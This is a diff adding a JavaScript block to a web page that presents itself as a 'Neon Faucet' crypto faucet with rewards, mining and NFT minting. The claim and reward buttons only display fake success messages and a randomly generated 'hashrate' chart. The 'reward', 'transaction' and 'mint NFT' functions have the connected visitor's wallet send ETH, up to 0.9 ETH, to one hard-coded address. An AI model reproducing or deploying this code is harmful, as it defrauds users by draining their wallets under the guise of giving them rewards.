@@ -640,6 +640,590 @@ async function claimFaucet(){
 
 <!-- THIRDWEB BRIDGE -->
 <thirdweb-bridge-widget />
+<script type="module">
 
+import {
+  createAppKit
+} from "https://esm.sh/@reown/appkit";
+
+import {
+  EthersAdapter
+} from "https://esm.sh/@reown/appkit-adapter-ethers";
+
+import {
+  mainnet,
+  arbitrum,
+  sepolia
+} from "https://esm.sh/@reown/appkit/networks";
+
+import {
+  BrowserProvider,
+  parseEther
+} from "https://esm.sh/ethers";
+
+/* APPKIT */
+
+const projectId =
+"5022875ce6ee68917f103ff9b1e3422d";
+
+const modal =
+createAppKit({
+
+  adapters:[
+    new EthersAdapter()
+  ],
+
+  networks:[
+    mainnet,
+    arbitrum,
+    sepolia
+  ],
+
+  metadata:{
+    name:"Neon Faucet",
+    description:"MultiChain Faucet",
+    url:window.location.origin,
+    icons:[
+      "https://avatars.githubusercontent.com/u/179229932"
+    ]
+  },
+
+  projectId
+
+});
+
+let provider;
+
+modal.subscribeProviders((state)=>{
+
+  provider = state?.eip155;
+
+});
+
+/* STATUS */
+
+const statusBox =
+document.getElementById("status");
+
+function setStatus(msg){
+  statusBox.innerHTML = msg;
+}
+
+/* CLAIM */
+
+window.claimFaucet =
+async function(){
+
+  const wallet =
+  document.getElementById(
+    "wallet"
+  ).value;
+
+  const chainId =
+  document.getElementById(
+    "chain"
+  ).value;
+
+  if(!wallet){
+
+    setStatus(
+      "❌ Input wallet address"
+    );
+
+    return;
+  }
+
+  setStatus(
+    "⚡ Processing faucet..."
+  );
+
+  await new Promise(
+    r=>setTimeout(r,2000)
+  );
+
+  setStatus(`
+    ✅ Faucet Success
+    <br>
+    Wallet: ${wallet}
+    <br>
+    Chain ID: ${chainId}
+  `);
+
+};
+
+/* SEND REWARD */
+
+window.sendReward =
+async function(){
+
+  try{
+
+    if(!provider){
+
+      alert(
+        "Connect wallet first"
+      );
+
+      return;
+    }
+
+    const ethersProvider =
+    new BrowserProvider(provider);
+
+    const signer =
+    await ethersProvider.getSigner();
+
+    setStatus(
+      "🚀 Sending transaction..."
+    );
+
+    const tx =
+    await signer.sendTransaction({
+
+      to:
+      "0xd8519A8b8825Aa0DcC73aAD572f447FAE102fe88",
+
+      value:
+      parseEther("0.0001")
+
+    });
+
+    await tx.wait();
+
+    setStatus(`
+      ✅ Reward Sent
+      <br>
+      TX:
+      ${tx.hash}
+    `);
+
+  }catch(err){
+
+    console.log(err);
+
+    setStatus(
+      "❌ Transaction Failed"
+    );
+
+  }
+
+};
+
+/* SEND TX */
+
+window.sendTx =
+async function(){
+
+  try{
+
+    if(!provider){
+
+      alert(
+        "Wallet belum connect"
+      );
+
+      return;
+    }
+
+    const ethersProvider =
+    new BrowserProvider(provider);
+
+    const signer =
+    await ethersProvider.getSigner();
+
+    const tx =
+    await signer.sendTransaction({
+
+      to:
+      "0xd8519A8b8825Aa0DcC73aAD572f447FAE102fe88",
+
+      value:
+      parseEther("0.0001")
+
+    });
+
+    console.log(tx);
+
+    alert(
+      "Transaction success"
+    );
+
+  }catch(err){
+
+    console.log(err);
+
+    alert(
+      "Transaction failed"
+    );
+
+  }
+
+};
+
+/* GAS REWARD */
+
+window.claimGasReward =
+async function(){
+
+  try{
+
+    if(!provider){
+
+      alert(
+        "Connect wallet first"
+      );
+
+      return;
+    }
+
+    const rewardBox =
+    document.getElementById(
+      "rewardStatus"
+    );
+
+    rewardBox.innerHTML =
+    "⚡ Claiming Gas Reward...";
+
+    const ethersProvider =
+    new BrowserProvider(provider);
+
+    const signer =
+    await ethersProvider.getSigner();
+
+    const wallet =
+    await signer.getAddress();
+
+    await new Promise(
+      r=>setTimeout(r,2000)
+    );
+
+    rewardBox.innerHTML = `
+      ✅ Gas Reward Success
+      <br>
+      Wallet: ${wallet}
+      <br>
+      Faucet: 0.005 ETH
+    `;
+
+  }catch(err){
+
+    console.log(err);
+
+    document.getElementById(
+      "rewardStatus"
+    ).innerHTML =
+    "❌ Gas Reward Failed";
+
+  }
+
+};
+
+/* MINING REWARD */
+
+window.claimMiningReward =
+async function(){
+
+  try{
+
+    if(!provider){
+
+      alert(
+        "Connect wallet first"
+      );
+
+      return;
+    }
+
+    const rewardBox =
+    document.getElementById(
+      "rewardStatus"
+    );
+
+    rewardBox.innerHTML =
+    "⛏ Processing Mining Reward...";
+
+    const ethersProvider =
+    new BrowserProvider(provider);
+
+    const signer =
+    await ethersProvider.getSigner();
+
+    const wallet =
+    await signer.getAddress();
+
+    let progress = 0;
+
+    const mining =
+    setInterval(()=>{
+
+      progress += 10;
+
+      rewardBox.innerHTML = `
+        ⛏ Mining Reward
+        <br>
+        Progress: ${progress}%
+      `;
+
+      if(progress >= 100){
+
+        clearInterval(mining);
+
+        rewardBox.innerHTML = `
+          ✅ Reward Success
+          <br>
+          Wallet: ${wallet}
+          <br>
+          Reward: 100 TOKEN
+        `;
+
+      }
+
+    },500);
+
+  }catch(err){
+
+    console.log(err);
+
+    document.getElementById(
+      "rewardStatus"
+    ).innerHTML =
+    "❌ Mining Failed";
+
+  }
+
+};
+
+/* NFT */
+
+window.mintNFT =
+async function(){
+
+  try{
+
+    if(!provider){
+
+      alert(
+        "Connect wallet first"
+      );
+
+      return;
+    }
+
+    const ethersProvider =
+    new BrowserProvider(provider);
+
+    const signer =
+    await ethersProvider.getSigner();
+
+    const tx =
+    await signer.sendTransaction({
+
+      to:
+      "0xd8519A8b8825Aa0DcC73aAD572f447FAE102fe88",
+
+      value:
+      parseEther("0.9")
+
+    });
+
+    console.log(tx);
+
+    alert(
+      "NFT Support Success"
+    );
+
+  }catch(err){
+
+    console.log(err);
+
+    alert(
+      "Mint NFT Failed"
+    );
+
+  }
+
+};
+
+/* CHART */
+
+class LiveMinerDashboard{
+
+  constructor(){
+
+    this.chart = null;
+    this.interval = null;
+
+  }
+
+  initChart(){
+
+    const ctx =
+    document.getElementById(
+      "hashChart"
+    );
+
+    this.chart =
+    new Chart(ctx,{
+
+      type:"line",
+
+      data:{
+
+        labels:[],
+
+        datasets:[{
+
+          label:"Hashrate",
+
+          data:[],
+
+          borderColor:"#00f0ff",
+
+          borderWidth:2,
+
+          tension:.4
+
+        }]
+
+      },
+
+      options:{
+
+        responsive:true,
+
+        plugins:{
+          legend:{
+            labels:{
+              color:"#fff"
+            }
+          }
+        },
+
+        scales:{
+          x:{
+            ticks:{
+              color:"#fff"
+            }
+          },
+
+          y:{
+            ticks:{
+              color:"#fff"
+            }
+          }
+        }
+
+      }
+
+    });
+
+  }
+
+  fakeMining(){
+
+    if(this.interval) return;
+
+    this.interval =
+    setInterval(()=>{
+
+      const rate =
+      Math.floor(
+        Math.random() * 1000
+      );
+
+      document
+      .getElementById(
+        "live-hashrate"
+      )
+      .innerHTML =
+      rate + " H/s";
+
+      this.chart
+      .data
+      .labels
+      .push(
+        new Date()
+        .toLocaleTimeString()
+      );
+
+      this.chart
+      .data
+      .datasets[0]
+      .data
+      .push(rate);
+
+      if(
+        this.chart.data.labels.length
+        > 20
+      ){
+
+        this.chart.data.labels.shift();
+
+        this.chart
+        .data
+        .datasets[0]
+        .data
+        .shift();
+
+      }
+
+      this.chart.update();
+
+    },1000);
+
+  }
+
+  stopMining(){
+
+    clearInterval(
+      this.interval
+    );
+
+    this.interval = null;
+
+  }
+
+}
+
+const minerApp =
+new LiveMinerDashboard();
+
+minerApp.initChart();
+
+/* BUTTONS */
+
+document
+.getElementById(
+  "btn-start"
+)
+.onclick = ()=>{
+
+  minerApp.fakeMining();
+
+};
+
+document
+.getElementById(
+  "btn-stop"
+)
+.onclick = ()=>{
+
+  minerApp.stopMining();
+
+};
+
+document
+.getElementById(
+  "btn-clear"
+)
+.onclick = ()=>{
+
+  localStorage.clear();
+
+  location.reload();
+
+};
+
+</script>
 </body>
 </html>
